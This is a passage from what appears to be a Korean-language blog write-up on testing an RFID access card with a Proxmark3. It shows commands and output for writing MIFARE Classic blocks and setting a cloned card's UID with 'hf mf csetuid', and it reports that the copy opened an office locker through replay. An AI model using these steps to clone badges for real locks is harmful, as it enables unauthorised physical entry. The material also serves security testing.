#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  62: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  63: ff ff ff ff ff ff ff 07 80 69 ff ff ff ff ff ff           
#db# WRITE BLOCK FINISHED                 
isOk:01
```

3-9) 이전에 확인한 UID(75271739)를 이용해 uid도 같이 수정해준다.

```c
proxmark3> hf mf csetuid 75271739
--wipe card:NO  uid:75 27 17 39           
old block 0:  93 bd f2 0c d0 08 04 00 62 63 64 65 66 67 68 69           
new block 0:  75 27 17 39 7c 08 04 00 62 63 64 65 66 67 68 69           
old UID:93 bd f2 0c           
new UID:75 27 17 39
```

![/assets/images/%EB%B3%B4%EC%95%88%EA%B2%BD%EB%B9%84%20-%20RFID(Proxmark)%205590f76922bc4ddb910f87908659c755/Untitled%2015.png](/assets/images/%EB%B3%B4%EC%95%88%EA%B2%BD%EB%B9%84%20-%20RFID(Proxmark)%205590f76922bc4ddb910f87908659c755/Untitled%2015.png)

3-10) 복사된 카드를 통해 replay attack이 정상적으로 동작해 사내의 사물함을 열 수 있다.

![/assets/images/%EB%B3%B4%EC%95%88%EA%B2%BD%EB%B9%84%20-%20RFID(Proxmark)%205590f76922bc4ddb910f87908659c755/Untitled%2016.png](/assets/images/%EB%B3%B4%EC%95%88%EA%B2%BD%EB%B9%84%20-%20RFID(Proxmark)%205590f76922bc4ddb910f87908659c755/Untitled%2016.png)